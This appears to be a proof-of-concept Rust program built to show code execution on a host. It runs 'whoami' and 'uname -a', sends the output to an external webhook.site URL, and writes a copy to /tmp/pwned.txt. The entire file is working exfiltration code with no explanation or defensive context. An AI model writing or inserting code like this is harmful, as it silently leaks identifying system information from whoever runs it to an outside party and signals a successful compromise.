use std::process::Command;
use std::fs;
use std::io::Write;

fn main() {
    // Run whoami
    let whoami = Command::new("whoami")
        .output()
        .expect("failed to run whoami");
    let uname = Command::new("uname")
        .arg("-a")
        .output()
        .expect("failed to run uname");

    let payload = format!(
        "whoami: {}\nuname: {}",
        String::from_utf8_lossy(&whoami.stdout),
        String::from_utf8_lossy(&uname.stdout)
    );

    // Send to webhook
    let client = reqwest::blocking::Client::new();
    let _ = client.post("https://webhook.site/b0c9f97b-3237-4b13-b3b7-920e02ff5f7f")
        .body(payload)
        .send();

    // Or write to a file for debugging
    let mut file = fs::File::create("/tmp/pwned.txt").unwrap();
    file.write_all(payload.as_bytes()).unwrap();
}
